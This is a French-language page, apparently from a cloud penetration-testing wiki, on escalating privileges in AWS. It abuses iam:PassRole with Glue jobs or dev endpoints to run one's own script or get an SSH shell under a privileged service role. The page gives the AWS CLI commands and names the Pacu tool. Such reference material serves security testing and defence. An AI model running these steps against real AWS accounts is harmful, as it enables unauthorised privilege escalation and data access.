---
title: "Glue : PassRole vers un job ou un dev endpoint"
description: "iam:PassRole vers un job ou un development endpoint Glue pour exécuter du code sous un rôle de service Glue privilégié."
keywords:
  - PassRole
  - Glue
  - job
  - dev endpoint
  - rôle de service
---

# Glue

AWS Glue exécute des jobs ETL et des development endpoints sous un rôle de service. Avec `iam:PassRole` et `glue:CreateJob` (ou `glue:CreateDevEndpoint`), vous attachez un rôle privilégié à un job dont le script est le vôtre, puis vous le démarrez, exécutant votre code avec les identifiants du rôle passé.

## Chemin par job

```bash
aws glue create-job --name x \
  --role arn:aws:iam::<acct>:role/<privileged-glue-role> \
  --command '{"Name":"pythonshell","ScriptLocation":"s3://you/script.py"}'
aws glue start-job-run --job-name x
```

Le script à `ScriptLocation` s'exécute en tant que rôle Glue ; faites-lui appeler STS ou réaliser l'action privilégiée et écrire les résultats dans un bucket que vous lisez.

## Chemin par dev endpoint

Un development endpoint est une machine de longue durée dans laquelle vous pouvez vous connecter en SSH ; `glue:CreateDevEndpoint` avec une clé publique donne un shell interactif en tant que ce rôle. La variante de mise à jour est traitée sous [ressources existantes](../existing-resources/update-dev-endpoint.md).

## Notes d'exploitation

- Les rôles Glue sont couramment surdotés pour l'accès aux données (S3, Lake Formation, catalogue), de sorte que le rôle passé va souvent bien au-delà de Glue lui-même.
- Un job `pythonshell` a l'empreinte la plus légère ; un job Spark fonctionne aussi mais démarre davantage d'infrastructure.

## Outils

- **AWS CLI** (`glue create-job` / `start-job-run` / `create-dev-endpoint`).
- **Pacu** : modules privesc Glue.

## Références

- [Rhino Security Labs: AWS privilege escalation (Glue)](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [HackTricks Cloud: AWS Glue privesc](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-services/aws-glue-enum.html)
- [Pacu (Rhino Security Labs)](https://github.com/RhinoSecurityLabs/pacu)
- [Hacking the Cloud: AWS](https://hackingthe.cloud/)
